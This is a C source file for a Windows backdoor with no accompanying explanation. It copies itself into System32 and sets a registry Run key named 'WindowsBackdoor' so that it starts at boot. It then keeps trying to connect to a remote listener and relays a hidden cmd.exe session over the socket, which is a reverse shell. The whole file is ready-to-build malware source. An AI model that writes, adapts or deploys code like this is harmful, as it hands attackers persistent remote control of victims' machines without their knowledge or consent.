#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include "main.h"

// Error handling macro
#define CHECK_ERROR(cond, msg) if (cond) { fprintf(stderr, "%s: %d\n", msg, WSAGetLastError()); exit(EXIT_FAILURE); }

void create_persistence();
void connect_to_listener(SOCKET *sock);
void run_shell(SOCKET sock);

int main() {
    WSADATA wsa;
    SOCKET sock;
    
    CHECK_ERROR(WSAStartup(MAKEWORD(2, 2), &wsa) != 0, "WSAStartup failed");
    
    create_persistence();
    connect_to_listener(&sock);
    run_shell(sock);
    
    WSACleanup();
    return 0;
}

void create_persistence() {
    char szPath[MAX_PATH];
    HKEY hKey;
    const char* czStartName = "WindowsBackdoor";
    const char* czExePath = "C:\\Windows\\System32\\win-backdoor.exe";

    GetModuleFileName(NULL, szPath, MAX_PATH);
    CopyFile(szPath, czExePath, FALSE);
    
    CHECK_ERROR(RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) != ERROR_SUCCESS, "Failed to open registry key");
    CHECK_ERROR(RegSetValueEx(hKey, czStartName, 0, REG_SZ, (const BYTE*)czExePath, strlen(czExePath) + 1) != ERROR_SUCCESS, "Failed to set registry value");
    RegCloseKey(hKey);
}

void connect_to_listener(SOCKET *sock) {
    struct sockaddr_in server;
    
    *sock = socket(AF_INET, SOCK_STREAM, 0);
    CHECK_ERROR(*sock == INVALID_SOCKET, "Socket creation failed");

    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    while (connect(*sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        Sleep(5000);
    }
}

void run_shell(SOCKET sock) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    HANDLE hReadPipe, hWritePipe;
    HANDLE hReadPipeIn, hWritePipeIn;
    char buffer[1024];
    DWORD bytesRead, bytesWritten;

    // Set security attributes to allow pipe handles to be inherited
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create pipes for STDOUT and STDERR
    CHECK_ERROR(!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0), "Pipe creation failed");
    CHECK_ERROR(!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0), "SetHandleInformation failed");

    // Create pipes for STDIN
    CHECK_ERROR(!CreatePipe(&hReadPipeIn, &hWritePipeIn, &sa, 0), "Pipe creation failed");
    CHECK_ERROR(!SetHandleInformation(hWritePipeIn, HANDLE_FLAG_INHERIT, 0), "SetHandleInformation failed");

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hReadPipeIn;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    ZeroMemory(&pi, sizeof(pi));

    CHECK_ERROR(!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi), "Process creation failed");

    // Close unneeded pipe handles
    CloseHandle(hWritePipe);
    CloseHandle(hReadPipeIn);

    // Main loop to read from the command socket and write to the shell's stdin
    while (1) {
        bytesRead = recv(sock, buffer, sizeof(buffer), 0);
        if (bytesRead <= 0) {
            break;
        }
        CHECK_ERROR(!WriteFile(hWritePipeIn, buffer, bytesRead, &bytesWritten, NULL), "WriteFile to pipe failed");

        // Read from the shell's stdout and send to the socket
        CHECK_ERROR(!ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL), "ReadFile from pipe failed");
        if (bytesRead == 0) {
            break;
        }
        buffer[bytesRead] = '\0';
        send(sock, buffer, bytesRead, 0);
    }


    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
}
